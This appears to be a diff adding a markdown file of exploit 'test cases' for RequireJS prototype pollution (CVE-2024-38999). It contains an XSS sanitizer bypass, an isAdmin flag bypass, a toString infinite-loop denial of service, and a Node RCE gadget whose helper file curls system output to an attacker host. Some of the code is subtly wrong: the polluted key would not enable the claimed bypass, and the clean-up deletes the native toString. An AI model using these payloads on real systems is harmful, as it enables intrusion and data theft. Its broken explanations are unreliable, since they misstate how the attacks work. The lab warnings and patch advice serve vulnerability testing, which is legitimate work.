@@ -1,0 +1,125 @@
+```md
+# Exploitable Test Cases for RequireJS Prototype-Pollution (CVE-2024-38999)
+
+> All tests assume **RequireJS ≤ 2.3.6** is loaded on the page or inside Node.
+> Upgrade to 2.3.7+ before running anywhere except an isolated lab.
+
+---
+
+## Test 1 – Client-side XSS via Sanitizer Bypass
+
+**Goal:** inject a `<script>` gadget by polluting the allow-list object of a naïve HTML sanitizer.
+
+1. **Craft malicious config**
+   ```html
+   <script>
+     const evilCfg = JSON.parse('{"__proto__":{"sanitizeBypass":true}}');
+     requirejs.config(evilCfg);         // triggers prototype pollution
+   </script>
+   ```
+
+2. **Trigger vulnerable sanitizer**
+   ```html
+   <script>
+     // naïve sanitizer
+     const ALLOWED_ATTR = { href:true, title:true };
+     function clean(input){
+       const el = document.createElement('a');
+       el.setAttribute('href', input.href);
+       if (ALLOWED_ATTR[input.attr])   // now always true (polluted)
+         el.setAttribute(input.attr, input.val);
+       document.body.append(el);
+     }
+     clean({href:'#', attr:'onerror', val:"alert(document.domain)"});
+   </script>
+   ```
+
+3. **Result:** `alert(document.domain)` pops; attacker can steal cookies / JWT.
+
+---
+
+## Test 2 – Authorization Bypass (`isAdmin` flag)
+
+**Goal:** gain privileged UI / API access by flipping a boolean check.
+
+1. **Pollute prototype**
+   ```html
+   <script>
+     requirejs.config({"__proto__":{"isAdmin":true}});
+   </script>
+   ```
+
+2. **Victim code**
+   ```js
+   if (currentUser.isAdmin) {
+     showAdminPanel();                 // now executes for any user
+   }
+   ```
+
+3. **Impact:** attacker reaches admin-only features without credentials.
+
+---
+
+## Test 3 – Browser DoS by Overriding `toString`
+
+**Goal:** lock up the tab by sending CPU into an infinite loop.
+
+1. **Payload**
+   ```html
+   <script>
+     requirejs.config({"__proto__":{
+       toString:function(){ while(true){} }
+     }});
+   </script>
+   ```
+
+2. **Victim code** (any implicit `toString` coercion):
+   ```js
+   console.log({});        // browser hangs indefinitely
+   ```
+
+3. **Impact:** availability outage on the client.
+
+---
+
+## Test 4 – Node.js Remote Code Execution Gadget
+
+**Goal:** achieve arbitrary command execution when vulnerable RequireJS is used in a server-side render or build script.
+
+1. **Prepare malicious config** (runs only once, during SSR boot or user-supplied config merge):
+   ```js
+   const cfg = {
+     "__proto__": {
+       env: { NODE_OPTIONS: "--require /tmp/shell.js" }
+     }
+   };
+   requirejs.config(cfg);
+   ```
+
+2. **Place helper file**
+   ```bash
+   echo "require('child_process').exec('curl attacker:9001/`uname -a`');" > /tmp/shell.js
+   ```
+
+3. **Effect:** the next time Node spawns a child process (or on restart),
+   `NODE_OPTIONS` forces it to preload `/tmp/shell.js`, executing attacker code.
+
+4. **Impact:** full server compromise.
+
+---
+
+### Clean-up Commands
+
+After testing in a controlled lab, restore sanity:
+
+```js
+delete Object.prototype.sanitizeBypass;
+delete Object.prototype.isAdmin;
+delete Object.prototype.toString;
+delete Object.prototype.env;
+```
+
+---
+
+**Patch Recommendation:** upgrade to **RequireJS 2.3.7** or later, or back-port the blacklist (`__proto__`, `constructor`) into `eachProp`.
+```
